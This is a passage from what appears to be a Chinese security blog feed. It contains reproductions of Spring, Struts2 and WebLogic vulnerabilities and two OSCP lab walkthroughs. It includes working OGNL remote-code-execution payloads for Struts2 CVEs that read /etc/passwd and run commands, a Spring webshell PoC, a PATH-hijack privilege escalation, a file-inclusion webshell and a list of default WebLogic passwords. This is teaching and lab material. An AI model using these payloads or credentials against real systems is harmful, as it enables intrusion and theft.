AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495; JSESSIONID=CF57B4777BD071833A15E58A4845A84D</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该poc改变Tomcat 日志为&#96;&#96;tomcatwar.jsp&#96;，如下执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.x.x:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-cybersploit</title>
      <link href="/2024/05/22/OSCP-cybersploit/"/>
      <url>/2024/05/22/OSCP-cybersploit/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Cybersploit"><a href="#OSCP系列靶机—Cybersploit" class="headerlink" title="OSCP系列靶机—Cybersploit"></a>OSCP系列靶机—Cybersploit</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-cybersploit/image-20240522183039941.png" alt="image-20240522183039941"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183112195.png" alt="image-20240522183112195"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-cybersploit/image-20240522183344280.png" alt="image-20240522183344280"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p22,80 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183355717.png" alt="image-20240522183355717"></p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183633494.png" alt="image-20240522183633494"></p><p>存在robots.txt 文件</p><h2 id="三、HTTP-信息收集"><a href="#三、HTTP-信息收集" class="headerlink" title="三、HTTP 信息收集"></a>三、HTTP 信息收集</h2><h3 id="1、robots-txt-文件"><a href="#1、robots-txt-文件" class="headerlink" title="1、robots.txt 文件"></a>1、robots.txt 文件</h3><p><img src="/img/OSCP-cybersploit/image-20240522183710155.png" alt="image-20240522183710155"></p><p>base64解码，得到flag1，这个flag1的内容似乎指向一个网页</p><p><img src="/img/OSCP-cybersploit/image-20240522183915085.png" alt="image-20240522183915085"></p><h3 id="2、页面源代码"><a href="#2、页面源代码" class="headerlink" title="2、页面源代码"></a>2、页面源代码</h3><p>有一张<code>hacker.gif</code>的图片和一个账号名：<code>itsskv</code></p><p><img src="/img/OSCP-cybersploit/image-20240522184607957.png" alt="image-20240522184607957"></p><h2 id="四、getshell"><a href="#四、getshell" class="headerlink" title="四、getshell"></a>四、getshell</h2><p>后面对<code>hacker.gif</code>做了处理，没有结果，到这里陷入了僵局。</p><p>看佬的文章说，flag1的内容就是该用户名的密码。</p><p>。。。正常人谁会这么想！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh itsskv@192.168.31.51</span><br><span class="line"></span><br><span class="line">//密码：cybersploit&#123;youtube.com/c/cybersploit&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522190320913.png" alt="image-20240522190320913"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、查看-etc-passwd文件"><a href="#1、查看-etc-passwd文件" class="headerlink" title="1、查看&#x2F;etc&#x2F;passwd文件"></a>1、查看&#x2F;etc&#x2F;passwd文件</h3><p>查看<code>/etc/passwd</code>发现还存在一个<code>cybersploit</code>的用户，嗯。。。</p><p><img src="/img/OSCP-cybersploit/image-20240522190539935.png" alt="image-20240522190539935"></p><h3 id="2、flag2-txt-文件"><a href="#2、flag2-txt-文件" class="headerlink" title="2、flag2.txt 文件"></a>2、flag2.txt 文件</h3><p>有一个flag2.txt 文件</p><p><img src="/img/OSCP-cybersploit/image-20240522190839543.png" alt="image-20240522190839543"></p><p><img src="/img/OSCP-cybersploit/image-20240522190833796.png" alt="image-20240522190833796"></p><p>高低得给<code>cybersploit</code>用户尝试下</p><p><img src="/img/OSCP-cybersploit/image-20240522191006392.png" alt="image-20240522191006392"></p><p>失败了</p><h3 id="3、权限提升"><a href="#3、权限提升" class="headerlink" title="3、权限提升"></a>3、权限提升</h3><p>普通提权方式的条件都没达到，只能拿出内核提权和提权工具。尝试内核提权，内核版本<code>3.13.0</code></p><p>一眼就相中这俩了</p><p><img src="/img/OSCP-cybersploit/image-20240522193330110.png" alt="image-20240522193330110"></p><p>查看<code>37292.c</code>文件内容</p><p><img src="/img/OSCP-cybersploit/image-20240522194633367.png" alt="image-20240522194633367"></p><p>按照提示，进行提权。将该文件上传至靶机后，编译运行</p><p><img src="/img/OSCP-cybersploit/image-20240522194545011.png" alt="image-20240522194545011"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Struts2 系列漏洞复现</title>
      <link href="/2024/05/21/VulnRep-Struts2/"/>
      <url>/2024/05/21/VulnRep-Struts2/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Struts2-系列漏洞复现"><a href="#【漏洞复现】Struts2-系列漏洞复现" class="headerlink" title="【漏洞复现】Struts2 系列漏洞复现"></a>【漏洞复现】Struts2 系列漏洞复现</h1><h2 id="一、Struts2-概述"><a href="#一、Struts2-概述" class="headerlink" title="一、Struts2 概述"></a>一、Struts2 概述</h2><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p><p>Struts 2是Apache 软件基金会下的Struts 1的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大，旨在提供更灵活、更强大的 MVC 架构来帮助开发者构建应用程序。</p><h2 id="二、s2-001-漏洞复现"><a href="#二、s2-001-漏洞复现" class="headerlink" title="二、s2-001  漏洞复现"></a>二、s2-001  漏洞复现</h2><h3 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>用户提交表单数据验证失败时，会将用户之前提交的参数值使用OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。如注册、登陆页面，提交失败后会默认返回之前提交的数据，且在后端使用 %{value} 对提交的数据进行了一次OGNL 表达式解析，因此可以直接构造payload 进行命令执行。</p><h3 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0 - 2.0.8</p><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p><img src="/img/VulnRep-Struts2/image-20240519150608509.png" alt="image-20240519150608509"></p><p>测试是否存在该漏洞，提交<code>%&#123;&#39;123&#39;&#125;</code>，返回结果为<code>123</code></p><p><img src="/img/VulnRep-Struts2/image-20240519150709336.png" alt="image-20240519150709336"></p><p>利用 OGNL 表达式来访问Java 系统属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;</span><br></pre></td></tr></table></figure><p>给到了用户的工作目录</p><p><img src="/img/VulnRep-Struts2/image-20240519151140263.png" alt="image-20240519151140263"></p><p>执行任意命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519151253042.png" alt="image-20240519151253042"></p><h2 id="三、s2-005-漏洞复现"><a href="#三、s2-005-漏洞复现" class="headerlink" title="三、s2-005  漏洞复现"></a>三、s2-005  漏洞复现</h2><h3 id="1、漏洞原理-1"><a href="#1、漏洞原理-1" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts  2.0.12)，struts2会将http的每个<strong>参数名</strong>解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开</p><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0-2.1.8.1</p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>在URL 上添加GET请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/1.txt%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519153246335.png" alt="image-20240519153246335"></p><h2 id="四、s2-007-漏洞复现"><a href="#四、s2-007-漏洞复现" class="headerlink" title="四、s2-007 漏洞复现"></a>四、s2-007 漏洞复现</h2><h3 id="1、漏洞原理-2"><a href="#1、漏洞原理-2" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>在用户登陆中，age 字段用户可控，传递一个非整数的值 会导致错误，而输入的非整数的值会被当作 ONGL 表达式执行，造成代码执行漏洞</p><h3 id="2、影响版本-2"><a href="#2、影响版本-2" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0 - 2.2.3</p><h3 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519155052688.png" alt="image-20240519155052688"></p><p><img src="/img/VulnRep-Struts2/image-20240519155138909.png" alt="image-20240519155138909"></p><h2 id="五、s2-008-漏洞复现"><a href="#五、s2-008-漏洞复现" class="headerlink" title="五、s2-008 漏洞复现"></a>五、s2-008 漏洞复现</h2><h3 id="1、漏洞原理-3"><a href="#1、漏洞原理-3" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对  Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode  模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。</p><h3 id="2、影响版本-3"><a href="#2、影响版本-3" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.1.0 – 2.3.1</p><h3 id="3、漏洞复现-3"><a href="#3、漏洞复现-3" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p><img src="/img/VulnRep-Struts2/image-20240519155541080.png" alt="image-20240519155541080"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519155800147.png" alt="image-20240519155800147"></p><p><img src="/img/VulnRep-Struts2/image-20240519155826251.png" alt="image-20240519155826251"></p><h2 id="六、s2-009-漏洞复现"><a href="#六、s2-009-漏洞复现" class="headerlink" title="六、s2-009 漏洞复现"></a>六、s2-009 漏洞复现</h2><h3 id="1、漏洞原理-4"><a href="#1、漏洞原理-4" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>OGNL提供了广泛的表达式评估功能，可以将任何暴露的字符串变量中的恶意表达式注入该功能。其中 ParametersInterceptor 中的正则表达式将<code>top[&#39;foo&#39;](0)</code>作为有效的表达式进行匹配，而OGNL 正好将该参数的值作为OGNL的表达式进行求值达成RCE。由于OGNL 语句在HTTP参数中，攻击者可以使用黑名单字符（例如 # ）禁用方法执行并执行任意方法，绕过ParametersInterceptor 和OGNL 库的保护。</p><h3 id="2、影响版本-4"><a href="#2、影响版本-4" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.1.0 - 2.3.1.1</p><h3 id="3、漏洞复现-4"><a href="#3、漏洞复现-4" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Struts2/image-20240521151249574.png" alt="image-20240521151249574"></p><p>2、漏洞存在的功能点</p><p><img src="/img/VulnRep-Struts2/image-20240521151422926.png" alt="image-20240521151422926"></p><p>3、构造POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22cat%20/etc/passwd%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240521152029957.png" alt="image-20240521152029957"></p><h2 id="七、s2-061-漏洞复现（CVE-2020-17530）"><a href="#七、s2-061-漏洞复现（CVE-2020-17530）" class="headerlink" title="七、s2-061 漏洞复现（CVE-2020-17530）"></a>七、s2-061 漏洞复现（CVE-2020-17530）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Apache Struts2 框架是一个用于开发Java EE 网络应用程序的Web 框架。该漏洞中，Struts2 会对某些变迁属性（如id等） 的属性值进行二次表达式解析，这些标签使用%{}的形式，当内容的值可控时，如%{payload}，会造成OGNL 表达式代码执行漏洞。</p><h3 id="2、影响版本-5"><a href="#2、影响版本-5" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0 - 2.5.25</p><h3 id="3、漏洞复现-5"><a href="#3、漏洞复现-5" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Struts2/image-20240521153309700.png" alt="image-20240521153309700"></p><p>2、查看是否存在漏洞，id变为49，存在漏洞</p><p><img src="/img/VulnRep-Struts2/image-20240521154118205.png" alt="image-20240521154118205"></p><p>3、加上POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure><p>![image-20240521154308136&#x2F;img&#x2F;VulnRep-Struts2&#x2F;-20240521154308136.png)</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts2系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Inclusiveness</title>
      <link href="/2024/05/20/OSCP-Inclusiveness/"/>
      <url>/2024/05/20/OSCP-Inclusiveness/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Inclusiveness"><a href="#OSCP系列靶机—Inclusiveness" class="headerlink" title="OSCP系列靶机—Inclusiveness"></a>OSCP系列靶机—Inclusiveness</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Inclusiveness/image-20240520151900221.png" alt="image-20240520151900221"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520152020037.png" alt="image-20240520152020037"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520152416619.png" alt="image-20240520152416619"></p><h3 id="3、服务版本扫描"><a href="#3、服务版本扫描" class="headerlink" title="3、服务版本扫描"></a>3、服务版本扫描</h3><p>使用基本的脚本对21，22，80端口进行服务探测和版本扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p21,22,80 192.168.31.50</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520152636647.png" alt="image-20240520152636647"></p><p>ftp 存在匿名访问，80采用apache2 的一个http服务，系统使用Debian</p><h3 id="4、nmap-基础漏洞探测"><a href="#4、nmap-基础漏洞探测" class="headerlink" title="4、nmap 基础漏洞探测"></a>4、nmap 基础漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p21,22,80 192.168.31.50</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520153649501.png" alt="image-20240520153649501"></p><p>未发现什么漏洞，指出80端口可能存在以下csrf 漏洞。</p><h2 id="三、ftp-信息收集"><a href="#三、ftp-信息收集" class="headerlink" title="三、ftp 信息收集"></a>三、ftp 信息收集</h2><p>ftp 的匿名访问查看ftp 服务有啥东西</p><p><img src="/img/OSCP-Inclusiveness/image-20240520153537590.png" alt="image-20240520153537590"></p><p>啥也没有，但可以上传文件</p><p><img src="/img/OSCP-Inclusiveness/image-20240520161820172.png" alt="image-20240520161820172"></p><h2 id="四、http-服务信息收集"><a href="#四、http-服务信息收集" class="headerlink" title="四、http 服务信息收集"></a>四、http 服务信息收集</h2><h3 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h3><p>过滤404、403</p><p><img src="/img/OSCP-Inclusiveness/image-20240520154229845.png" alt="image-20240520154229845"></p><h3 id="2、robots-txt-搜索引擎"><a href="#2、robots-txt-搜索引擎" class="headerlink" title="2、robots.txt 搜索引擎"></a>2、robots.txt 搜索引擎</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520154813062.png" alt="image-20240520154813062"></p><p>这些robots.txt 文件都在输出同样的语句，禁止我们的搜索引擎去访问robots.txt 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are not a search engine! You can&#x27;t read my robots.txt! </span><br></pre></td></tr></table></figure><p>找到了这篇文章：<a href="https://blog.csdn.net/sh2018/article/details/121042435">详细robots.txt写法大全和禁止目录收录及指定页面</a></p><p>其中提到了两个UA头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Baiduspider</span><br><span class="line">Googlebot</span><br></pre></td></tr></table></figure><p>抓包修改UA头，得到<code>/secret_information/</code>的路径</p><p><img src="/img/OSCP-Inclusiveness/image-20240520163123785.png" alt="image-20240520163123785"></p><p>访问</p><p><img src="/img/OSCP-Inclusiveness/image-20240520163208210.png" alt="image-20240520163208210"></p><h3 id="3、文件包含结合ftp-上传getshell"><a href="#3、文件包含结合ftp-上传getshell" class="headerlink" title="3、文件包含结合ftp 上传getshell"></a>3、文件包含结合ftp 上传getshell</h3><p>这里提到的是 DNS 区域传输攻击，不过这里考察的并不是该攻击，而是通过切换语言造成的文件包含漏洞</p><p><img src="/img/OSCP-Inclusiveness/image-20240520164607428.png" alt="image-20240520164607428"></p><p>ftp 的默认工作路径在<code>/var/ftp</code>，联合ftp 上传webshell进行包含</p><p><img src="/img/OSCP-Inclusiveness/image-20240520165148245.png" alt="image-20240520165148245"></p><p><img src="/img/OSCP-Inclusiveness/image-20240520165826526.png" alt="image-20240520165826526"></p><p>之后将webshell反弹到msf，这里就不演示了</p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权到tom"><a href="#1、提权到tom" class="headerlink" title="1、提权到tom"></a>1、提权到tom</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520170743996.png" alt="image-20240520170743996"></p><p><code>/home/tom/rootshell</code>文件相当可疑啊</p><p><img src="/img/OSCP-Inclusiveness/image-20240520170919194.png" alt="image-20240520170919194"></p><p>还有一个<code>rootshell.c</code>文件，疑似源代码文件</p><p><img src="/img/OSCP-Inclusiveness/image-20240520172008695.png" alt="image-20240520172008695"></p><p>这段代码大致的意思是如果whoami是tom ，则输出<code>access ...</code>并重新进入一个sh。</p><p>采用环境变量，伪造一个whoami 的可执行文件，劫持真正的whoami命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp ; echo &#x27;echo tom&#x27; &gt; whoami ; chmod +x whoami</span><br><span class="line"></span><br><span class="line">which whoami</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520173328198.png" alt="image-20240520173328198"></p><p>再次执行<code>rootshell</code> 文件，提权到tom</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173435588.png" alt="image-20240520173435588"></p><h3 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h3><p>通过<code>sudo -l</code>发现全命令可用，直接<code>sudo su</code>提权到root</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173609057.png" alt="image-20240520173609057"></p><p>获取flag</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173705535.png" alt="image-20240520173705535"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】WebLogic 系列漏洞复现</title>
      <link href="/2024/05/18/VulnRep-WebLogic/"/>
      <url>/2024/05/18/VulnRep-WebLogic/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】WebLogic-系列漏洞复现"><a href="#【漏洞复现】WebLogic-系列漏洞复现" class="headerlink" title="【漏洞复现】WebLogic 系列漏洞复现"></a>【漏洞复现】WebLogic 系列漏洞复现</h1><h2 id="一、WebLogic-概述"><a href="#一、WebLogic-概述" class="headerlink" title="一、WebLogic 概述"></a>一、WebLogic 概述</h2><p>WebLogic是oracle 公司出品的java中间件，可与Oracle 产品和技术相辅相成。</p><p>其默认的开放端口是7001</p><p>默认后台登录地址：<a href="http://xxxx.xxx:7001/console">http://xxxx.xxx:7001/console</a></p><p>一些常见的弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@123</span><br></pre></td></tr></table></figure><h2 id="二、XMLDecoder反序列化漏洞（CVE-2017-10271）"><a href="#二、XMLDecoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="二、XMLDecoder反序列化漏洞（CVE-2017-10271）"></a>二、XMLDecoder反序列化漏洞（CVE-2017-10271）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Weblogic的WLS Security 组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，由于XMLDecoder处理不当，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h3 id="2、漏洞影响"><a href="#2、漏洞影响" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>攻击者可以利用这个漏洞发送精心构造的XML数据，通过反序列化执行任意命令，甚至可以通过反弹shell拿到权限。</p><h3 id="3、漏洞涉及版本"><a href="#3、漏洞涉及版本" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><p>受影响的版本包括但不限于：</p><ol><li>OracleWebLogic Server 10.3.6.0.0</li><li>OracleWebLogic Server 12.1.3.0.0</li><li>OracleWebLogic Server 12.2.1.1.0</li><li>OracleWebLogic Server 12.2.1.2.0</li></ol><h3 id="4、漏洞复现"><a 